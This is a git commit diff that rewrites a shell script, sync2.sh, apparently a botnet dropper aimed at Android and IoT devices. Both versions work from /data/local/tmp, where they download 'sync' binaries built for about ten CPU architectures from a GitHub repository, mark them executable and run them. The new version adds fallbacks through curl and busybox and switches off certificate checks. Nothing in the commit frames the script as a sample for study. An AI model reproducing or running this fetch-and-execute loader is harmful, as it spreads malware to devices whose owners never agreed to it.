3ac889a0d149aa619db69dcbc35d8a5da6857ac8
davidsantos3825 <davidsantos3825@gmail.com>
2025-04-16 03:17:26 -0300

    Update sync2.sh

--- sync2.sh
+++ sync2.sh
@@ -1,11 +1,26 @@
 #!/bin/bash
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.x86; chmod +x *; ./sync.x86
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.mips; chmod +x *; ./sync.mips
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.mipsel; chmod +x *; ./sync.mipsel
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm4; chmod +x *; ./sync.arm4
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm5; chmod +x *; ./sync.arm5
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm6; chmod +x *; ./sync.arm6
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm7; chmod +x *;./sync.arm7
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.powerpc; chmod +x *; ./sync.powerpc
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.m68k; chmod +x *; ./sync.m68k
-cd /data/local/tmp; wget https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.sh4; chmod +x *; ./sync.sh4
+
+download_and_run() {
+    local url=$1
+    local file=$2
+    
+    cd /data/local/tmp
+    
+    wget --no-check-certificate "$url" -O "$file" || \
+    curl -k -L "$url" -o "$file" || \
+    busybox wget "$url" -O "$file"
+    
+    chmod +x "$file"
+    ./"$file"
+}
+
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.x86" "sync.x86"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.mips" "sync.mips"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.mipsel" "sync.mipsel"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm4" "sync.arm4"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm5" "sync.arm5"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm6" "sync.arm6"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.arm7" "sync.arm7"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.powerpc" "sync.powerpc"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.m68k" "sync.m68k"
+download_and_run "https://github.com/davidsantos3825/robopopgay/raw/refs/heads/main/sync.sh4" "sync.sh4"
